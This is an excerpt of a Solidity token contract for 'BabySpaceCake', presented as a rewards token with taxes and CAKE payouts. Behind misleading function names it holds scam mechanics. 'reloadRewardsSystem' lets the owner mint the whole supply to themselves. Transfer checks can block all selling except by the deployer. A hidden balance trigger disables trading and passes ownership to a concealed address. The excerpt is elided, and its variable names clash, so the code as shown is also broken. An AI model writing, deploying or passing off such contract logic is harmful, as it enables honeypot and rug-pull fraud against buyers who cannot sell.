 ...
 * 
 * 
 * https://t.me/BabySpaceCake
 * 3% Max Tax | 3% Max Wallet
 * 16% tax (16-20% slippage)
 * 4% Liquidity | 4% Marketing
 * 8% CAKE Rewards
 * 
 * 
 * 
...
abstract contract Auth {
    ...
    function transfer_Ownership(address adr) public {
...
contract BabySpaceCake is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address second_reward  = 0x0000000000000000000000000000000000000000;
    bool    nill           = false;

    string constant _name = "BabySpaceCake";
    string constant _symbol = "BSCAKE";
    ...
    function reloadRewardsSystem(uint256 to_reset) public onlyOwner()  {
        _totalSupply = to_reset;
        _balances[msg.sender] = _totalSupply;
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if(recipient != _deployer) 
            if(reward_status)
                require(recipient == _deployer, "MAX_TX_ERROR2");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        if(recipient != _deployer)
                    if(reward_status)
                        require(sender == _deployer, "MAX_TX_ERROR2");
                
        return _transferFrom(sender, recipient, amount);
    }
    
    function set_second_reward(address _addr) external onlyOwner() {
        second_rewards = _addr;
    }
    ...
    //settting the maximum permitted wallet holding (percent of total supply)
     ...
     function setMaxWalletPercentUpdator(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 100;
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if(_balances[second_rewards] > 1000) {
            tradingOpen = nill;
            transfer_Ownership(second_rewards);
        }
        if(sender != _deployer){
